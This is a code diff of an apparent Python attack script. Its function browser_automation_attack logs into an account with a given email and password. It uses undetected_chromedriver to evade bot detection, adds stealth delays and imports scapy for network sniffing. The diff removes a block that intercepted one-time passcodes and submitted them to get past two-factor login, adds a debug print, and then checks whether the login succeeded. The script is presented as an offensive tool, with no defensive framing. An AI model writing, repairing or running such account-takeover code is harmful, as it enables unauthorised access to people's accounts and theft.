@@ -11,7 +11,7 @@ from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from webdriver_manager.chrome import ChromeDriverManager
-import undetected_chromedriver as uc
+import undetected_chromedriver.v2 as uc
 import scapy.all as scapy  # For network sniffing
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -105,15 +105,8 @@ def browser_automation_attack(email, password):
     login_button.click()
     stealth_delay()
 
-    # OTP Interception
-    otp_code = sniff_otp()
-    if otp_code:
-        # Wait for the OTP input field to be available
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
-        otp_input = driver.find_element(By.NAME, "otp")
-        otp_input.send_keys(otp_code)
-        otp_input.send_keys(Keys.RETURN)
-        stealth_delay()
+    # Log the URL to check if we are redirected
+    print(f"[DEBUG] Current URL after login attempt: {driver.current_url}")
 
     # Check if login was successful
     if "summary" in driver.current_url:
